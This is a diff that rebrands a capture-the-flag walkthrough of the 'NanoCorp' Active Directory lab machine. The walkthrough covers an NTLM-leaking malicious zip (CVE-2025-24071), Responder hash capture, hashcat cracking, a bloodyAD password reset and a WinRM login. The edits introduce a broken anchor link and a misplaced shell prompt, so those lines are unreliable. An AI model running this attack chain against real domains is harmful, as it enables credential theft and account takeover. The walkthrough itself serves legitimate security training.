@@ -18,23 +18,34 @@ Jun 20, 2026
 - [Box Info](#box-info)
 - [Recon](#recon)
 - [Auth as web_svc](#auth-as-web_svc)
-- [Shell as monitoring_svc](#shell-as-monitoring_svc)
+- [Shell as monitoring_svc](#monitoring-svc)
 - [Shell as Administrator](#shell-as-administrator)
 - [Beyond Root](#beyond-root)
 
-NanoCorp is a Windows Active Directory machine built around a careers portal that accepts uploaded application archives. I’ll craft a malicious archive that leaks a service account’s authentication to my host when an automated job extracts it, and crack the result to get a foothold. With BloodHound, I’ll map a permissions chain that lets me add my user to a support group and then reset a second service account’s password. That account sits in the Protected Users group, so I’ll authenticate over Kerberos to get a shell. From there, I’ll find the Checkmk monitoring agent installed and abuse CVE-2024-0670 to drop write-protected files into a temp directory that the agent runs as SYSTEM, taking full control of the host. In Beyond Root, I’ll dig into the scheduled automations that keep the box in its intended state.
+NanoCorp is a Windows Active Directory machine built around a careers portal that accepts uploaded application archives. We craft a malicious archive that leaks a service account’s authentication to our host when an automated job extracts it, and crack the result to get a foothold. With BloodHound, we map a permissions chain that lets us add our user to a support group and then reset a second service account’s password. That account sits in the Protected Users group, so we authenticate over Kerberos to get a shell. From there, we find the Checkmk monitoring agent installed and abuse CVE-2024-0670 to drop write-protected files into a temp directory that the agent runs as SYSTEM, taking full control of the host. In Beyond Root, we dig into the scheduled automations that keep the box in its intended state.
 
 ---
 
 ## Box Info
 
-| Attribute | Value |
-|---|---|
-| **OS** | Windows |
-| **Difficulty** | Hard |
-| **Release Date** | 08 Nov 2025 |
-| **Retire Date** | 20 Jun 2026 |
-| **Creator** | EmSec |
+<div class="machine-info-box" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; background: var(--bg-card); border-left: 4px solid var(--text-success); border-top: 1px solid var(--border-color); border-right: 1px solid var(--border-color); border-bottom: 1px solid var(--border-color); border-radius: var(--border-radius-lg); padding: var(--spacing-lg); margin-bottom: var(--spacing-xl);">
+  <div style="display: flex; flex-direction: column; gap: 4px;">
+    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Operating System</span>
+    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">🪟 Windows</span>
+  </div>
+  <div style="display: flex; flex-direction: column; gap: 4px;">
+    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Difficulty Level</span>
+    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">Hard</span>
+  </div>
+  <div style="display: flex; flex-direction: column; gap: 4px;">
+    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Release Date</span>
+    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">08 Nov 2025</span>
+  </div>
+  <div style="display: flex; flex-direction: column; gap: 4px;">
+    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Creator</span>
+    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">EmSec</span>
+  </div>
+</div>
 
 ---
 
@@ -44,7 +55,7 @@ NanoCorp is a Windows Active Directory machine built around a careers portal tha
 nmap finds 20 open TCP ports:
 
 ```bash
-oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.243.199
+vulnquest@kali$ sudo nmap -p- --reason --min-rate 10000 10.129.243.199
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-11 21:42 UTC
 Nmap scan report for 10.129.243.199
 Host is up, received echo-reply ttl 127 (0.020s latency).
@@ -75,7 +86,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
 ```
 
 ```bash
-oxdf@hacky$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49664,49668,61162,61167,61189,63772 -sCV 10.129.243.199
+vulnquest@kali$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49664,49668,61162,61167,61189,63772 -sCV 10.129.243.199
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-11 21:45 UTC
 Nmap scan report for 10.129.243.199
 Host is up (0.020s latency).
@@ -115,9 +126,9 @@ Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:wind
 The box shows many of the ports associated with a Windows Domain Controller. The domain is `nanocorp.htb`, and the hostname is `DC01`. We use `netexec` to check access and configure our hosts file:
 
 ```bash
-oxdf@hacky$ netexec smb 10.129.243.199 --generate-hosts-file hosts
+vulnquest@kali$ netexec smb 10.129.243.199 --generate-hosts-file hosts
 SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-oxdf@hacky$ cat hosts /etc/hosts | sudo tee /etc/hosts | head -1
+vulnquest@kali$ cat hosts /etc/hosts | sudo tee /etc/hosts | head -1
 10.129.243.199     DC01.nanocorp.htb nanocorp.htb DC01
 ```
 
@@ -126,7 +137,7 @@ oxdf@hacky$ cat hosts /etc/hosts | sudo tee /etc/hosts | head -1
 ## Auth as web_svc
 
 ### Recover Net-NTLMv2
-Given that I have a Windows server clearly decompressing a Zip file, **CVE-2025-24071** seems like a good fit. We craft a malicious `.library-ms` file and zip it:
+Given that we have a Windows server clearly decompressing a Zip file, **CVE-2025-24071** seems like a good fit. We craft a malicious `.library-ms` file and zip it:
 
 ```python
 # generate_payload.py
@@ -150,7 +161,7 @@ with zipfile.ZipFile("0xdf.zip", 'w') as z:
 We upload `0xdf.zip` through the careers portal, and capture the Net-NTLMv2 hash using **Responder**:
 
 ```bash
-oxdf@hacky$ sudo Responder -I tun0
+vulnquest@kali$ sudo Responder -I tun0
 [SMB] NTLMv2-SSP Client   : 10.129.243.199
 [SMB] NTLMv2-SSP Username : NANOCORP\web_svc
 [SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:99c66f...
@@ -158,7 +169,7 @@ oxdf@hacky$ sudo Responder -I tun0
 
 We crack the hash using `hashcat`:
 ```bash
-oxdf@hacky$ hashcat -m 5600 web_svc.hash rockyou.txt
+vulnquest@kali$ hashcat -m 5600 web_svc.hash rockyou.txt
 web_svc::NANOCORP:...:dksehdgh712!@#
 ```
 
@@ -170,21 +181,21 @@ web_svc::NANOCORP:...:dksehdgh712!@#
 We run BloodHound to map paths, discovering that `web_svc` has control to add members to `IT_Support`, which has `ForceChangePassword` rights over `monitoring_svc`.
 
 ```bash
-oxdf@hacky$ bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember IT_Support web_svc
+vulnquest@kali$ bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember IT_Support web_svc
 [+] web_svc added to IT_Support
 ```
 
 We reset the password of `monitoring_svc`:
 ```bash
-oxdf@hacky$ bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc '0xdf0xdf.'
+vulnquest@kali$ bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc '0xdf0xdf.'
 [+] Password changed successfully!
 ```
 
 Since `monitoring_svc` is in the Protected Users group, we obtain a Kerberos TGT and authenticate using `evil-winrm-py` with SSL on port 5986:
 
 ```bash
-oxdf@hacky$ evil-winrm-py -i DC01.nanocorp.htb -u monitoring_svc -p 0xdf0xdf. -k --ssl
-evil-winrm-py PS C:\Users\monitoring_svc\Desktop> type user.txt
+vulnquest@kali$ evil-winrm-py -i DC01.nanocorp.htb -u monitoring_svc -p 0xdf0xdf. -k --ssl
+vulnquest@kali$ evil-winrm-py PS C:\Users\monitoring_svc\Desktop> type user.txt
 b08297a9************************
 ```
 
